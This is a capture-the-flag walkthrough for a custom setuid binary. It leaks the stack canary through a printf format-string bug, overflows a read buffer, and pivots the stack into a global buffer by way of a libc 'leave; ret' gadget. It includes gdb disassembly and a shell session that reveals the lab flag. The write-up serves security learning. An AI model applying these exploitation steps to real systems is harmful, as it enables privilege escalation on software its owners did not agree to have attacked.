## Level 08

This level is quite similar to the previous level as in, we do not have a source file and `checksec` returns the same flags:

```bash
level08@rainfall:~$ ll
total 48
drwxr-x---  3 level08 level08  4096 Nov 13 15:00 ./
drwxr-xr-x 37 root    root     4096 Jun  9 23:13 ../
-rw-r--r--  1 level08 level08   220 Mar 31  2024 .bash_logout
-rw-r--r--  1 level08 level08  3771 Mar 31  2024 .bashrc
drwx------  2 level08 level08  4096 Nov 13 15:00 .cache/
-rw-r--r--  1 level08 level08    30 Jun  9 23:12 .gdbinit
-rw-r--r--  1 level08 level08   807 Mar 31  2024 .profile
-rwsr-x---  1 flag08  level08 16792 Jun  9 23:13 maelcum*
...
level08@rainfall:~$ ls
maelcum
...
level08@rainfall:~$ checksec maelcum
[*] '/home/level08/maelcum'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

So let's just run the binary and see what happens.

```bash
level08@rainfall:~$ ./maelcum 
  [ZION] Maelcum speaks.
  [MAELCUM] Relay node — Babylon not.
[MAELCUM] Tag this relay (who's asking?): TEST
[MAELCUM] Logging relay tag: TEST
[MAELCUM] Send it: RELAY: test
[MAELCUM] Ready for 0 bytes: [MAELCUM] Relayed 0 bytes.
[MAELCUM] Route 0: ZION via MAELCUM (1 hops)
[MAELCUM] Route 1: FREESIDE via GATEWAY_3 (3 hops)
[MAELCUM] Route 2: VILLA_STRAYLIGH via TESSIER_GW (5 hops)
```

We get two user inputs, lets try to see if only of them contain a `printf format exploit`:

```bash
level08@rainfall:~$ ./maelcum 
  [ZION] Maelcum speaks.
  [MAELCUM] Relay node — Babylon not.
[MAELCUM] Tag this relay (who's asking?): %p
[MAELCUM] Logging relay tag: 0x7fffffffdf10
[MAELCUM] Send it: %p
[MAELCUM] Unknown command.
[MAELCUM] Route 0: ZION via MAELCUM (1 hops)
[MAELCUM] Route 1: FREESIDE via GATEWAY_3 (3 hops)
[MAELCUM] Route 2: VILLA_STRAYLIGH via TESSIER_GW (5 hops)
```

Just like before, the first input allows us to leak the `stack canary`.

Now that we have all of this information we can attempt to decompile the executable.
Using `gdb` we'll take a look at all the important functions and decompile it by hand.
Starting off with the main function we'll be able to tell a bit more on the flow of the program:

```bash
level08@rainfall:~$ gdb -n ./maelcum
...
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004017bb <+0>:	endbr64
   0x00000000004017bf <+4>:	push   %rbp
   0x00000000004017c0 <+5>:	mov    %rsp,%rbp
   0x00000000004017c3 <+8>:	sub    $0x10,%rsp
   0x00000000004017c7 <+12>:	mov    %fs:0x28,%rax
   0x00000000004017d0 <+21>:	mov    %rax,-0x8(%rbp)
   0x00000000004017d4 <+25>:	xor    %eax,%eax
   0x00000000004017d6 <+27>:	call   0x401276 <init_routing>
   0x00000000004017db <+32>:	call   0x40132a <print_banner>
   0x00000000004017e0 <+37>:	mov    $0x3,%edx
   0x00000000004017e5 <+42>:	lea    0x965(%rip),%rax        # 0x402151
   0x00000000004017ec <+49>:	mov    %rax,%rsi
   0x00000000004017ef <+52>:	lea    0x965(%rip),%rax        # 0x40215b
   0x00000000004017f6 <+59>:	mov    %rax,%rdi
   0x00000000004017f9 <+62>:	call   0x4013a2 <add_route>
   0x00000000004017fe <+67>:	mov    $0x5,%edx
   0x0000000000401803 <+72>:	lea    0x95a(%rip),%rax        # 0x402164
   0x000000000040180a <+79>:	mov    %rax,%rsi
   0x000000000040180d <+82>:	lea    0x95b(%rip),%rax        # 0x40216f
   0x0000000000401814 <+89>:	mov    %rax,%rdi
   0x0000000000401817 <+92>:	call   0x4013a2 <add_route>
   0x000000000040181c <+97>:	call   0x4014c2 <relay_status>
   0x0000000000401821 <+102>:	call   0x4015a7 <relay_data>
   0x0000000000401826 <+107>:	call   0x4016d0 <print_routes>
   0x000000000040182b <+112>:	mov    $0x0,%eax
   0x0000000000401830 <+117>:	mov    -0x8(%rbp),%rdx
   0x0000000000401834 <+121>:	sub    %fs:0x28,%rdx
   0x000000000040183d <+130>:	je     0x401844 <main+137>
   0x000000000040183f <+132>:	call   0x401120 <__stack_chk_fail@plt>
   0x0000000000401844 <+137>:	leave
   0x0000000000401845 <+138>:	ret
End of assembler dump.
```

There are a couple of function calls, `init_routing`, `print_banner`, `add_route`, `relay_status`, `relay_data` and `print_routes`.
Doing a bit of digging inside of those we're quickly able to see that both the `relay` functions are vulnerable, as they are the ones that contain calls to `read`.

For our decompiled [`source file`](./source.c) we've focussed on those functions, as the other ones were not needed to be decompiled.
Just like the previous level we'll only give an overview of the disassembly, some of the details as the resolving of addresses and strings should be clear by now.

Lets start with the `relay_status`'s disassembly as this function is called first:

```bash
(gdb) disas relay_status
Dump of assembler code for function relay_status:
   0x00000000004014c2 <+0>:	endbr64
   0x00000000004014c6 <+4>:	push   %rbp
   0x00000000004014c7 <+5>:	mov    %rsp,%rbp
   0x00000000004014ca <+8>:	sub    $0x60,%rsp
   0x00000000004014ce <+12>:	mov    %fs:0x28,%rax
   0x00000000004014d7 <+21>:	mov    %rax,-0x8(%rbp)
   0x00000000004014db <+25>:	xor    %eax,%eax
   0x00000000004014dd <+27>:	lea    0xb84(%rip),%rax        # 0x402068
   0x00000000004014e4 <+34>:	mov    %rax,%rdi
   0x00000000004014e7 <+37>:	mov    $0x0,%eax
   0x00000000004014ec <+42>:	call   0x401130 <printf@plt>
   0x00000000004014f1 <+47>:	mov    0x2b88(%rip),%rax        # 0x404080 <stdout@GLIBC_2.2.5>
   0x00000000004014f8 <+54>:	mov    %rax,%rdi
   0x00000000004014fb <+57>:	call   0x401170 <fflush@plt>
   0x0000000000401500 <+62>:	lea    -0x50(%rbp),%rax
   0x0000000000401504 <+66>:	mov    $0x3f,%edx
   0x0000000000401509 <+71>:	mov    %rax,%rsi
   0x000000000040150c <+74>:	mov    $0x0,%edi
   0x0000000000401511 <+79>:	call   0x401160 <read@plt>
   0x0000000000401516 <+84>:	mov    %rax,-0x58(%rbp)
   0x000000000040151a <+88>:	cmpq   $0x0,-0x58(%rbp)
   0x000000000040151f <+93>:	jns    0x401529 <relay_status+103>
   0x0000000000401521 <+95>:	movq   $0x0,-0x58(%rbp)
   0x0000000000401529 <+103>:	lea    -0x50(%rbp),%rdx
   0x000000000040152d <+107>:	mov    -0x58(%rbp),%rax
   0x0000000000401531 <+111>:	add    %rdx,%rax
   0x0000000000401534 <+114>:	movb   $0x0,(%rax)
   0x0000000000401537 <+117>:	lea    -0x50(%rbp),%rax
   0x000000000040153b <+121>:	lea    0xb51(%rip),%rdx        # 0x402093
   0x0000000000401542 <+128>:	mov    %rdx,%rsi
   0x0000000000401545 <+131>:	mov    %rax,%rdi
   0x0000000000401548 <+134>:	call   0x401150 <strcspn@plt>
   0x000000000040154d <+139>:	movb   $0x0,-0x50(%rbp,%rax,1)
   0x0000000000401552 <+144>:	lea    0xb3c(%rip),%rax        # 0x402095
   0x0000000000401559 <+151>:	mov    %rax,%rdi
   0x000000000040155c <+154>:	mov    $0x0,%eax
   0x0000000000401561 <+159>:	call   0x401130 <printf@plt>
   0x0000000000401566 <+164>:	lea    -0x50(%rbp),%rax
   0x000000000040156a <+168>:	mov    %rax,%rdi
   0x000000000040156d <+171>:	mov    $0x0,%eax
   0x0000000000401572 <+176>:	call   0x401130 <printf@plt>
   0x0000000000401577 <+181>:	mov    $0xa,%edi
   0x000000000040157c <+186>:	call   0x4010e0 <putchar@plt>
   0x0000000000401581 <+191>:	mov    0x2af8(%rip),%rax        # 0x404080 <stdout@GLIBC_2.2.5>
   0x0000000000401588 <+198>:	mov    %rax,%rdi
   0x000000000040158b <+201>:	call   0x401170 <fflush@plt>
   0x0000000000401590 <+206>:	nop
   0x0000000000401591 <+207>:	mov    -0x8(%rbp),%rax
   0x0000000000401595 <+211>:	sub    %fs:0x28,%rax
   0x000000000040159e <+220>:	je     0x4015a5 <relay_status+227>
   0x00000000004015a0 <+222>:	call   0x401120 <__stack_chk_fail@plt>
   0x00000000004015a5 <+227>:	leave
   0x00000000004015a6 <+228>:	ret
End of assembler dump.
```

A decently sized function with the allocation of `0x60` bytes on the stack.
We can assume a couple of things right off the bat, the `rbp` gets indexed on two offsets, `-0x50` and `-0x58`.
This means we'll have two variables, and both are used around a call to `read`.

One being assigned the `rax` value, causing it to be of an `ssize_t` type.
The other one is used as the second argument, making it a `char array`.
The size of which we can also determine to be `64` bytes, as the `read` call is given `63` bytes.
The last few bytes are used as padding or alignment by the compiler.

The most important thing in this function is the sequence found at `<+164>` and after.
Here the array found at `-0x50` is given to `printf` as it's format string, giving us a way to leak the stack canary.

Next up we can take a look the other function that requires user input, `relay_data`: 

```bash
(gdb) disas relay_data
Dump of assembler code for function relay_data:
   0x00000000004015a7 <+0>:	endbr64
   0x00000000004015ab <+4>:	push   %rbp
   0x00000000004015ac <+5>:	mov    %rsp,%rbp
   0x00000000004015af <+8>:	sub    $0x40,%rsp
   0x00000000004015b3 <+12>:	mov    %fs:0x28,%rax
   0x00000000004015bc <+21>:	mov    %rax,-0x8(%rbp)
   0x00000000004015c0 <+25>:	xor    %eax,%eax
   0x00000000004015c2 <+27>:	lea    0xaea(%rip),%rax        # 0x4020b3
   0x00000000004015c9 <+34>:	mov    %rax,%rdi
   0x00000000004015cc <+37>:	mov    $0x0,%eax
   0x00000000004015d1 <+42>:	call   0x401130 <printf@plt>
   0x00000000004015d6 <+47>:	mov    0x2aa3(%rip),%rax        # 0x404080 <stdout@GLIBC_2.2.5>
   0x00000000004015dd <+54>:	mov    %rax,%rdi
   0x00000000004015e0 <+57>:	call   0x401170 <fflush@plt>
   0x00000000004015e5 <+62>:	lea    -0x30(%rbp),%rax
   0x00000000004015e9 <+66>:	mov    $0x40,%edx
   0x00000000004015ee <+71>:	mov    %rax,%rsi
   0x00000000004015f1 <+74>:	mov    $0x0,%edi
   0x00000000004015f6 <+79>:	call   0x401160 <read@plt>
   0x00000000004015fb <+84>:	lea    -0x30(%rbp),%rax
   0x00000000004015ff <+88>:	mov    $0x6,%edx
   0x0000000000401604 <+93>:	lea    0xabc(%rip),%rcx        # 0x4020c7
   0x000000000040160b <+100>:	mov    %rcx,%rsi
   0x000000000040160e <+103>:	mov    %rax,%rdi
   0x0000000000401611 <+106>:	call   0x401100 <strncmp@plt>
   0x0000000000401616 <+111>:	test   %eax,%eax
   0x0000000000401618 <+113>:	jne    0x4016aa <relay_data+259>
   0x000000000040161e <+119>:	lea    -0x30(%rbp),%rax
   0x0000000000401622 <+123>:	add    $0x6,%rax
   0x0000000000401626 <+127>:	mov    $0xa,%edx
   0x000000000040162b <+132>:	mov    $0x0,%esi
   0x0000000000401630 <+137>:	mov    %rax,%rdi
   0x0000000000401633 <+140>:	call   0x401180 <strtoul@plt>
   0x0000000000401638 <+145>:	mov    %eax,-0x34(%rbp)
   0x000000000040163b <+148>:	cmpl   $0x1ff,-0x34(%rbp)
   0x0000000000401642 <+155>:	ja     0x4016b9 <relay_data+274>
   0x0000000000401644 <+157>:	mov    -0x34(%rbp),%eax
   0x0000000000401647 <+160>:	mov    %eax,%esi
   0x0000000000401649 <+162>:	lea    0xa80(%rip),%rax        # 0x4020d0
   0x0000000000401650 <+169>:	mov    %rax,%rdi
   0x0000000000401653 <+172>:	mov    $0x0,%eax
   0x0000000000401658 <+177>:	call   0x401130 <printf@plt>
   0x000000000040165d <+182>:	mov    0x2a1c(%rip),%rax        # 0x404080 <stdout@GLIBC_2.2.5>
   0x0000000000401664 <+189>:	mov    %rax,%rdi
   0x0000000000401667 <+192>:	call   0x401170 <fflush@plt>
   0x000000000040166c <+197>:	mov    -0x34(%rbp),%eax
   0x000000000040166f <+200>:	mov    %rax,%rdx
   0x0000000000401672 <+203>:	lea    0x2b87(%rip),%rax        # 0x404200 <relay_buf>
   0x0000000000401679 <+210>:	mov    %rax,%rsi
   0x000000000040167c <+213>:	mov    $0x0,%edi
   0x0000000000401681 <+218>:	call   0x401160 <read@plt>
   0x0000000000401686 <+223>:	mov    %eax,0x2d74(%rip)        # 0x404400 <relay_len>
   0x000000000040168c <+229>:	mov    0x2d6e(%rip),%eax        # 0x404400 <relay_len>
   0x0000000000401692 <+235>:	mov    %eax,%esi
   0x0000000000401694 <+237>:	lea    0xa54(%rip),%rax        # 0x4020ef
   0x000000000040169b <+244>:	mov    %rax,%rdi
   0x000000000040169e <+247>:	mov    $0x0,%eax
   0x00000000004016a3 <+252>:	call   0x401130 <printf@plt>
   0x00000000004016a8 <+257>:	jmp    0x4016b9 <relay_data+274>
   0x00000000004016aa <+259>:	lea    0xa5b(%rip),%rax        # 0x40210c
   0x00000000004016b1 <+266>:	mov    %rax,%rdi
   0x00000000004016b4 <+269>:	call   0x401110 <puts@plt>
   0x00000000004016b9 <+274>:	nop
   0x00000000004016ba <+275>:	mov    -0x8(%rbp),%rax
   0x00000000004016be <+279>:	sub    %fs:0x28,%rax
   0x00000000004016c7 <+288>:	je     0x4016ce <relay_data+295>
   0x00000000004016c9 <+290>:	call   0x401120 <__stack_chk_fail@plt>
   0x00000000004016ce <+295>:	leave
   0x00000000004016cf <+296>:	ret
End of assembler dump.
```

This function also creates a couple variables on the stack, notably on offsets `-0x30` and `-0x34`.
There is a total of `0x40` bytes of space created, meaning we'll have `0xc` or `12` bytes of padding/alignment at the end.

The variable located at offset `-0x34` is assigned the `rax` value after a call to `strtoul`.
This causes it to have the type `unsigned long`.

The other variable can be found at offset `-0x30` and is used in a call to `read`.
The third argument for this call is set to the value `0x40`, `64` bytes.
However our buffer cannot contain this many bytes, as it could contain a maximum of `40` bytes.

Since the buffer is index at `-0x30` and the stack canary is located at `-0x8` there is only space for `40` bytes between the two.
We've gone off the assumption that the original source code has the buffer set to `32` bytes and that the compiler added an extra 8 bytes of padding/alignment between the two, creating a gap of an additional `8` bytes.

A read call that reads more bytes than it should instantly gives us access to our second exploit, the `buffer overflow`.
However since this `read` call is limited to `64` bytes, our `shellcode` cannot fit behind the input buffer like in previous levels.

Luckily for us, if we continue the disassembly we'll find another input, previously hidden to us.

The first few bytes of our array get compared to the string `"RELAY:"` with the use of `strncmp`.
If the string matches, the array gets offset by `6` bytes and handed to `strtoul`.
The return of that call will then be stored into the `unsigned long` variable we've mentioned above.

As long as the value is lower than `512` we'll continue through the function and reach another call to `read`.
This call is a bit special, since it does not read into a variable on the stack but rather a global variable called `relay_buf`.

We can determine the size of this variable using `objdump`:

```bash
level08@rainfall:~$ objdump -x ./maelcum | grep "relay_buf"
0000000000404200 l     O .bss	0000000000000200              relay_buf
```

Here `objdump` tells us that the variable is located in the `.bss` segment with the address `0x404200` and is `0x200` or `512` bytes long. 
More than enough space to house our `shellcode ROP chain`.

However, since this buffer is not located on or behind the stack of our vulnerable function we can't simply overwrite the `saved RIP`.
Instead we'll need to use a tool we've learned in [`level02`](../../level02/resources/walkthrough.md), a `stack pivot`.

One way to do so would be to return all the way to main, and let the `leave; ret` jump to our `shellcode`.
Another approach utilizes a small `gadget` that does the pivot for us, and set the `saved RIP` to it.

Since with the second approach we would not have to worry about other function calls, lets try to find one such `gadget` using `ROPgaget`:

```bash
level08@rainfall:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": leave ; ret"
0x00000000000299d2 : leave ; ret
0x000000000012622b : leave ; retf
```

`libc` contains one at the offset `0x0299d2`, so lets use it and begin crafting our [`exploit`](./exploit.py)!

Our payload looks mostly the same, apart from an added `8 bytes` of `padding`.
These bytes need to be here since the `pivot gadget` does a `pop` as well.

The biggest change is the addition of the `payload_setup`.
Here we set everything in place so that the `RSP` will eventually point to our `shellcode`.

First we'll need to add the `"RELAY:"` string, after which the size of the payload gets encoded.
Then we perform the `buffer overflow`, overwriting the `saved RBP` to the global buffer and setting the `saved RIP` to the `pivot gadget`.

Once the `relay_data` function returns, the stack will be set to our array after which the `ROP chain` will successfully execute.

Now that we have our updated `exploit` script, all that is left to do is run it obtain the flag:

```bash
level08@rainfall:~$ python3 exploit.py 
[+] Starting local process '/home/level08/maelcum': pid 1079
[*] Switching to interactive mode

$ id
uid=1009(level08) gid=1011(level08) euid=1025(flag08) groups=1011(level08),1001(levelgroup)
$ cat /home/flag08/.pass
l3w1pdvtlapo1nmo8uttd1m0pen4iiuk
```
